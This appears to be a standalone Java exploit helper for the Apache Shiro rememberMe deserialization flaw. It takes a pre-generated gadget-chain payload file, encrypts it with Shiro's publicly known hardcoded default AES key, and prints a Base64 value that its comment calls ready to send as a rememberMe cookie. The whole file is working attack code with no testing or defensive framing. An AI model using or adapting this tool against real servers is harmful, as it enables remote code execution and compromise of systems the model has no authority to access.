import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.security.SecureRandom;
import java.util.Base64;

/**
 * Takes an already-generated Java deserialization gadget-chain payload
 * (e.g. the CC6 payload from GenCC6) and AES-CBC-encrypts it with Shiro's
 * hardcoded default key, exactly like a real Shiro app would encrypt a
 * legitimate rememberMe cookie -- except we control the plaintext.
 * Output is ready to send as: Cookie: rememberMe=<output>
 */
public class EncryptForShiro {
    static final byte[] DEFAULT_KEY = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");

    public static void main(String[] args) throws Exception {
        String payloadFile = args.length > 0 ? args[0] : "payload.bin";

        FileInputStream fis = new FileInputStream(payloadFile);
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        byte[] tmp = new byte[4096];
        int n;
        while ((n = fis.read(tmp)) != -1) buf.write(tmp, 0, n);
        fis.close();
        byte[] plain = buf.toByteArray();

        byte[] iv = new byte[16];
        new SecureRandom().nextBytes(iv);

        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(DEFAULT_KEY, "AES"), new IvParameterSpec(iv));
        byte[] ciphertext = cipher.doFinal(plain);

        byte[] combined = new byte[iv.length + ciphertext.length];
        System.arraycopy(iv, 0, combined, 0, iv.length);
        System.arraycopy(ciphertext, 0, combined, iv.length, ciphertext.length);

        String cookie = Base64.getEncoder().encodeToString(combined);
        System.out.println(cookie);
    }
}
